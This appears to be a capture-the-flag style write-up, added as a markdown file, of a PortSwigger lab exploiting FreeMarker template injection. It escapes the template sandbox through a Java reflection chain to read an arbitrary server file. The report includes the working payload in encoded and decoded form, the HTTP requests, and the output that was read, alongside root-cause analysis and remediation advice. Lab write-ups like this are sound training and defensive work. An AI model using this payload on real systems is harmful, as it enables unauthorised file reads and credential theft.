@@ -1,0 +1,218 @@
+# Server-Side Template Injection via FreeMarker Sandbox Bypass (Reflection Escape)
+
+> **Platform:** PortSwigger Web Security Academy
+> **Category:** Server-Side Template Injection (SSTI)
+> **Difficulty:** Practitioner
+> **Status:** Solved
+
+---
+
+# Table of Contents
+1. Executive Summary
+2. Risk Classification
+3. Vulnerability Information
+4. Affected Asset
+5. Technical Description
+6. Methodology
+7. Relevant HTTP Requests
+8. Proof of Concept (PoC)
+9. Evidence
+10. Impact Analysis
+11. Root Cause
+12. Recommendations
+13. References
+14. Conclusion
+
+---
+
+# 1. Executive Summary
+
+The application was vulnerable to **Server-Side Template Injection (SSTI)** in the product description template editor, rendered server-side using the **FreeMarker** template engine.
+
+The application implemented a sandbox intended to restrict access to dangerous FreeMarker utility classes (such as `freemarker.template.utility.Execute`). However, this sandbox failed to restrict Java reflection performed through objects already exposed to the template's data model — specifically the `product` object. By chaining standard Java reflection calls (`getClass()`, `getProtectionDomain()`, `getCodeSource()`, `getLocation()`), it was possible to obtain a `java.net.URL` object, pivot to an arbitrary absolute file path via `URI.resolve()`, and read the contents of a sensitive file (`/home/carlos/my_password.txt`) from the underlying filesystem — completely bypassing the sandbox restrictions.
+
+---
+
+# 2. Risk Classification
+
+| Classification | Value |
+|----------------|-------|
+| Severity | Critical |
+| CVSS v3.1 | 9.1 (Critical) |
+| CWE | CWE-1336 – Improper Neutralization of Special Elements Used in a Template Engine |
+| CWE (secondary) | CWE-693 – Protection Mechanism Failure (Sandbox Bypass) |
+| OWASP Top 10 | A03:2021 – Injection |
+
+---
+
+# 3. Vulnerability Information
+
+**Vulnerability Type**
+Server-Side Template Injection (SSTI) with Sandbox Bypass via Java Reflection
+
+**Injection Point**
+
+**Template Engine**
+Apache FreeMarker
+
+---
+
+# 4. Affected Asset
+
+Content management endpoint used to edit product description templates:
+POST /content-manager/product/{id}/description
+
+
+Publicly rendered resource where the payload output is displayed:
+GET /product?productId={id}
+
+---
+
+# 5. Technical Description
+
+The application allowed authenticated content managers to edit FreeMarker templates used to render product descriptions. User-supplied template code was compiled and evaluated server-side using `freemarker.template.Template`, with a data model that exposed a `product` object (a Java POJO/DTO) to the template context.
+
+To mitigate the inherent risks of SSTI, the application employed a sandboxing mechanism designed to block access to known-dangerous FreeMarker utility classes and methods capable of arbitrary code execution or file access (e.g. `freemarker.template.utility.Execute`, `ObjectConstructor`).
+
+However, the sandbox only enforced restrictions on **explicit access to blacklisted utility classes**. It did not account for **implicit reflection chains** reachable through any object already present in the data model. Since every Java object inherits `getClass()` from `java.lang.Object`, and `Class` exposes methods such as `getProtectionDomain()`, it was possible to pivot from a harmless, application-provided object (`product`) into JDK internals with real filesystem capabilities — without ever invoking a class the sandbox explicitly monitored.
+
+---
+
+# 6. Methodology
+
+1. Confirm SSTI by injecting a basic arithmetic expression (`${7*7}`) and observing evaluation.
+2. Confirm access to the `product` object exposed in the data model.
+3. Consult the JavaDoc for `java.lang.Object` to identify universally available methods (`getClass()`).
+4. Chain reflective calls through `Class`, `ProtectionDomain`, `CodeSource`, and `URL` to reach filesystem-capable methods.
+5. Use `URI.resolve()` with an absolute path to redirect from the application's own code location to an arbitrary file (`/home/carlos/my_password.txt`).
+6. Open a stream to the target file and read its raw bytes.
+7. Convert the byte array to a printable representation using FreeMarker's `?join(" ")` built-in, since raw `byte[]` output is not natively renderable.
+8. Save the template and retrieve the rendered product page to obtain the output.
+9. Convert the space-separated decimal ASCII codes back into readable text.
+
+---
+
+# 7. Relevant HTTP Requests
+
+## 7.1 Injecting the Payload into the Template
+
+```http
+POST /content-manager/product/1/description HTTP/1.1
+Host: <LAB-ID>.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=<SESSION_TOKEN>
+
+csrf=<CSRF_TOKEN>&template=%24%7Bproduct.getClass%28%29.getProtectionDomain%28%29.getCodeSource%28%29.getLocation%28%29.toURI%28%29.resolve%28%27%2Fhome%2Fcarlos%2Fmy_password.txt%27%29.toURL%28%29.openStream%28%29.readAllBytes%28%29%3Fjoin%28%22%20%22%29%7D
+```
+
+---
+
+## 7.2 Retrieving the Rendered Output
+
+```http
+GET /product?productId=1 HTTP/1.1
+Host: <LAB-ID>.web-security-academy.net
+Cookie: session=<SESSION_TOKEN>
+```
+
+---
+
+# 8. Proof of Concept (PoC)
+
+Injected payload (decoded):
+
+```freemarker
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
+```
+
+Reflection chain executed by the JVM on the server:
+product → ProductDto instance (application data)
+.getClass() → Class<ProductDto>
+.getProtectionDomain() → ProtectionDomain
+.getCodeSource() → CodeSource
+.getLocation() → URL (application's own code location)
+.toURI() → URI
+.resolve('/home/carlos/my_password.txt') → URI (arbitrary absolute path)
+.toURL() → URL
+.openStream() → InputStream
+.readAllBytes() → byte[] (raw file contents)
+
+The resulting `byte[]` was serialized by FreeMarker's `?join(" ")` built-in into a space-separated list of decimal ASCII values, since the engine cannot natively print binary data.
+
+---
+
+# 9. Evidence
+
+### Injected Payload
+```text
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
+```
+
+### Rendered Output (product description page)
+102 120 101 51 56 51 120 122 51 107 115 106 118 50 56 55 110 105 54 99
+### Decoded Output
+fxe383xz3ksjv287ni6c
+---
+
+# 10. Impact Analysis
+
+Successful exploitation allows an attacker to read arbitrary files from the underlying filesystem with the privileges of the web application process, entirely bypassing the intended sandbox restrictions. Depending on the file targeted, this may lead to:
+
+- Disclosure of credentials, private keys, and configuration secrets
+- Exposure of source code and internal application logic
+- Retrieval of other users' sensitive data
+- A foothold for further exploitation (e.g. chaining with other reflection paths toward code execution)
+- Complete compromise of confidentiality for the host system
+
+---
+
+# 11. Root Cause
+
+The application's template sandbox implemented a **blacklist-based restriction model**, blocking known-dangerous FreeMarker utility classes rather than restricting the broader capability of Java reflection itself.
+
+Specifically, it lacks:
+
+- Restriction of reflective methods (`getClass()` and its downstream chain) on data-model objects
+- A whitelist-based sandboxing approach instead of a blacklist
+- Isolation between the template evaluation context and the underlying JVM/filesystem
+- Validation that template-supplied expressions cannot escape the intended data model scope
+
+---
+
+# 12. Recommendations
+
+## High Priority
+Do not allow untrusted users to author or edit server-side templates at all; treat template content as code, not data.
+
+## High Priority
+If template editing must be supported, use FreeMarker's `TemplateClassResolver` restrictions in combination with a strict `ObjectWrapper` that blocks reflective access to `Class`, `ProtectionDomain`, `CodeSource`, and similar JDK internals — not just known utility classes.
+
+## High Priority
+Adopt a whitelist-based sandbox model that only exposes explicitly approved methods/properties on data-model objects, rather than blacklisting specific dangerous classes.
+
+## Medium Priority
+Run the template rendering process in an isolated, low-privilege environment (e.g. separate process/container) with no access to sensitive files.
+
+## Medium Priority
+Disable or restrict `getClass()` exposure on data-model objects passed into the template context where feasible.
+
+## Low Priority
+Monitor and alert on template save operations containing reflective patterns such as `getClass()`, `getProtectionDomain()`, `getCodeSource()`, or `Runtime`.
+
+---
+
+# 13. References
+
+- PortSwigger Web Security Academy – Server-Side Template Injection
+- FreeMarker Documentation – Security Considerations for Untrusted Templates
+- OWASP – Server-Side Template Injection Cheat Sheet
+- CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine
+- CWE-693: Protection Mechanism Failure
+
+---
+
+# 14. Conclusion
+
+The assessment confirmed the presence of a **Server-Side Template Injection** vulnerability with a **sandbox bypass via Java reflection**. Although the application attempted to restrict access to known-dangerous FreeMarker utilities, it failed to account for reflective escapes reachable through any object exposed in the template's data model.
+
+This demonstrates that blacklist-based sandboxing of template engines is fundamentally fragile: as long as any application object is exposed to user-controlled template code, an attacker can pivot through standard Java reflection to reach JDK classes capable of arbitrary file access, representing a significant risk to the confidentiality of the affected system.
